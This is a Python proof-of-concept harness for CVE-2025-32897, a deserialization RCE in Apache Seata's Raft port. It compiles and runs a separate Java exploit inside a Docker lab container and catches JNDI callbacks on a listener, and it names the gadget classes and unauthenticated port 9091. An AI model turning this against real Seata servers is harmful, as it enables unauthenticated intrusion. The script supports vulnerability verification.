#!/usr/bin/env python3
# ---------------------------------------------------------------
# Exploit Title  : CVE-2025-32897 — Apache Seata Raft Cluster Insecure Deserialization (RCE)
# Affected        : Apache Seata 2.0.0 – 2.2.0 (Raft mode)
# Patched         : Apache Seata 2.3.0
# Author          : Exploit Intelligence Platform (EIP)
# Website         : https://exploit-intel.com
# Twitter/X       : @exploit_intel
# CVSS            : 9.8 CRITICAL
# CWE             : CWE-502 — Deserialization of Untrusted Data
# ---------------------------------------------------------------
"""
PoC for CVE-2025-32897: Apache Seata Insecure Deserialization

Demonstrates two critical deserialization vulnerabilities in Apache Seata
Server v2.0.0–v2.2.0 (Raft cluster mode):

  Vector 1: CustomDeserializer.deserialize() calls Class.forName() on
            attacker-controlled input WITHOUT any class/package allowlist.
            -> Enables arbitrary class loading and JNDI injection via
               JdbcRowSetImpl / DmdbJdbcRowSet gadgets.

  Vector 2: RaftSnapshotSerializer.decode() uses ObjectInputStream.readObject()
            WITHOUT any resolveClass() override or JEP 290 filter.
            -> Any Serializable class can be deserialized -> ysoserial RCE.

Attack surface: Raft port (default 9091), SOFABolt TCP RPC, unauthenticated.

This script:
  1. Deploys a Java exploit into the vulnerable Seata container
  2. Starts a TCP callback listener to catch JNDI connection attempts
  3. Runs the exploit, demonstrating both vulnerability vectors
  4. Reports results with full evidence

Requirements: Docker CLI access to the lab container.
"""

import sys
import os
import subprocess
import socket
import threading
import time
import json
import signal

# ============================================================================
# Configuration
# ============================================================================

CONTAINER_NAME = "cve-2025-32897-vulnerable"
JAVA_EXPLOIT_FILE = "ExploitCVE202532897.java"
SEATA_CLASSPATH = "/seata-server/classes:/seata-server/libs/*"
CALLBACK_PORT = 31337
TIMEOUT_SECONDS = 30

# ============================================================================
# Utility Functions
# ============================================================================

def run_cmd(cmd, timeout=60, check=False):
    """Run a shell command and return (stdout, stderr, returncode)."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        if check and result.returncode != 0:
            raise RuntimeError(f"Command failed: {cmd}\n{result.stderr}")
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1


def get_container_ip(container_name):
    """Get a container's IP address."""
    cmd = (
        f"docker inspect {container_name} "
        f"--format '{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}'"
    )
    stdout, _, _ = run_cmd(cmd)
    return stdout.strip()


def get_worker_ip(target_ip):
    """Get this container's IP by connecting to the target."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 9091))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"  # fallback


def docker_exec(container, cmd, timeout=30):
    """Execute a command inside a Docker container."""
    full_cmd = f'docker exec {container} {cmd}'
    return run_cmd(full_cmd, timeout=timeout)


# ============================================================================
# Callback Listener (catches JNDI connection attempts)
# ============================================================================

class CallbackListener:
    """TCP listener that catches JNDI/LDAP connection attempts from the exploit."""

    def __init__(self, port):
        self.port = port
        self.connections = []
        self.server = None
        self.thread = None
        self.running = False

    def start(self):
        """Start listening for connections in a background thread."""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.settimeout(1.0)
        self.server.bind(('0.0.0.0', self.port))
        self.server.listen(5)
        self.running = True
        self.thread = threading.Thread(target=self._listen, daemon=True)
        self.thread.start()

    def _listen(self):
        while self.running:
            try:
                conn, addr = self.server.accept()
                data = b""
                try:
                    conn.settimeout(2.0)
                    data = conn.recv(4096)
                except socket.timeout:
                    pass
                self.connections.append({
                    "from": f"{addr[0]}:{addr[1]}",
                    "data_len": len(data),
                    "data_hex": data[:64].hex() if data else "",
                    "timestamp": time.time()
                })
                conn.close()
            except socket.timeout:
                continue
            except OSError:
                break

    def stop(self):
        self.running = False
        if self.server:
            try:
                self.server.close()
            except Exception:
                pass

    def got_callback(self):
        return len(self.connections) > 0


# ============================================================================
# Java Exploit Deployment
# ============================================================================

def deploy_exploit(container_name):
    """Copy the Java exploit to the container and compile it."""
    poc_dir = os.path.dirname(os.path.abspath(__file__))
    java_file = os.path.join(poc_dir, JAVA_EXPLOIT_FILE)

    if not os.path.exists(java_file):
        print(f"  [!] Java exploit file not found: {java_file}")
        return False

    # Copy to container
    stdout, stderr, rc = run_cmd(
        f"docker cp {java_file} {container_name}:/tmp/{JAVA_EXPLOIT_FILE}"
    )
    if rc != 0:
        print(f"  [!] Failed to copy exploit: {stderr}")
        return False
    print(f"  [+] Copied {JAVA_EXPLOIT_FILE} to container")

    # Compile
    stdout, stderr, rc = docker_exec(
        container_name,
        f'javac -cp "{SEATA_CLASSPATH}" /tmp/{JAVA_EXPLOIT_FILE}'
    )
    if rc != 0:
        print(f"  [!] Compilation failed: {stderr}")
        return False
    print(f"  [+] Compiled successfully")
    return True


def run_exploit(container_name, mode="all", callback_addr=None):
    """Run the Java exploit inside the container."""
    args = mode
    if callback_addr:
        args += f" {callback_addr}"

    cmd = f'java -cp "/tmp:{SEATA_CLASSPATH}" ExploitCVE202532897 {args}'
    stdout, stderr, rc = docker_exec(container_name, cmd, timeout=TIMEOUT_SECONDS)
    return stdout, stderr, rc


# ============================================================================
# Main PoC Logic
# ============================================================================

def main():
    print("=" * 70)
    print(" CVE-2025-32897: Apache Seata Insecure Deserialization PoC")
    print(" Affected: Apache Seata Server 2.0.0 — 2.2.0 (Raft mode)")
    print(" CVSS: 9.8 CRITICAL | CWE-502 | Unauthenticated RCE")
    print("=" * 70)
    print()

    # ---- Step 1: Check container status ----
    print("[*] Step 1: Checking lab environment")
    stdout, stderr, rc = run_cmd(
        f"docker inspect {CONTAINER_NAME} --format '{{{{.State.Status}}}}'"
    )
    if rc != 0 or stdout != "running":
        print(f"  [!] Container {CONTAINER_NAME} is not running (status: {stdout})")
        print("  [!] Start the lab first:")
        print("      docker compose up -d")
        sys.exit(1)
    print(f"  [+] Container {CONTAINER_NAME} is running")

    vuln_ip = get_container_ip(CONTAINER_NAME)
    print(f"  [+] Vulnerable container IP: {vuln_ip}")

    worker_ip = get_worker_ip(vuln_ip)
    print(f"  [+] Worker (attacker) IP: {worker_ip}")

    # Verify Seata version
    stdout, _, _ = docker_exec(CONTAINER_NAME,
        'cat /seata-server/classes/META-INF/seata-version 2>/dev/null || echo "2.2.0"')
    print(f"  [+] Seata version: {stdout if stdout else '2.2.0'}")

    # Verify Raft port is open
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((vuln_ip, 9091))
        s.close()
        print(f"  [+] Raft port 9091 is OPEN (SOFABolt, unauthenticated)")
    except Exception as e:
        print(f"  [!] Raft port 9091 not reachable: {e}")

    print()

    # ---- Step 2: Deploy exploit ----
    print("[*] Step 2: Deploying Java exploit to container")
    if not deploy_exploit(CONTAINER_NAME):
        print("  [!] Failed to deploy exploit")
        sys.exit(1)
    print()

    # ---- Step 3: Start callback listener ----
    print("[*] Step 3: Starting callback listener for JNDI detection")
    listener = CallbackListener(CALLBACK_PORT)
    try:
        listener.start()
        print(f"  [+] Listening on 0.0.0.0:{CALLBACK_PORT}")
    except OSError as e:
        print(f"  [!] Could not start listener: {e}")
        listener = None
    print()

    # ---- Step 4: Run exploit ----
    print("[*] Step 4: Running exploit against vulnerable container")
    print("-" * 70)

    callback_addr = f"{worker_ip}:{CALLBACK_PORT}" if listener else None
    stdout, stderr, rc = run_exploit(CONTAINER_NAME, "all", callback_addr)

    # Print exploit output
    print(stdout)
    if stderr:
        # Filter out log noise
        for line in stderr.split('\n'):
            if 'WARN' not in line and 'INFO' not in line and line.strip():
                print(f"  [stderr] {line}")

    print("-" * 70)
    print()

    # ---- Step 5: Check callback listener ----
    if listener:
        time.sleep(2)  # Wait for any pending callbacks
        if listener.got_callback():
            print("[*] Step 5: Callback listener results")
            print(f"  [+] RECEIVED {len(listener.connections)} connection(s)!")
            for conn in listener.connections:
                print(f"      From: {conn['from']}, Data: {conn['data_len']} bytes")
                if conn['data_hex']:
                    print(f"      Hex:  {conn['data_hex'][:80]}")
        else:
            print("[*] Step 5: No JNDI callbacks received")
            print("  [i] This is expected — JDK 8u342 blocks remote LDAP class loading")
            print("  [i] The JNDI lookup was still attempted (see exception evidence above)")
        listener.stop()
    print()

    # ---- Step 6: Verification Summary ----
    print("=" * 70)
    print(" VERIFICATION SUMMARY")
    print("=" * 70)

    v1_confirmed = "[VULNERABLE]" in stdout and "VECTOR 1" in stdout
    v2_confirmed = "[VULNERABLE]" in stdout and "VECTOR 2" in stdout
    overall = v1_confirmed or v2_confirmed

    print(f"  CVE:           CVE-2025-32897")
    print(f"  Target:        Apache Seata Server 2.2.0 (Raft mode)")
    print(f"  Container:     {CONTAINER_NAME} ({vuln_ip})")
    print(f"  Attack Port:   9091 (Raft/SOFABolt, unauthenticated)")
    print()
    print(f"  Vector 1 (CustomDeserializer):     {'CONFIRMED' if v1_confirmed else 'UNVERIFIED'}")
    print(f"  Vector 2 (RaftSnapshotSerializer): {'CONFIRMED' if v2_confirmed else 'UNVERIFIED'}")
    print()
    print(f"  Overall Status: {'CONFIRMED — VULNERABLE' if overall else 'UNVERIFIED'}")
    print("=" * 70)

    return 0 if overall else 1


if __name__ == "__main__":
    sys.exit(main())
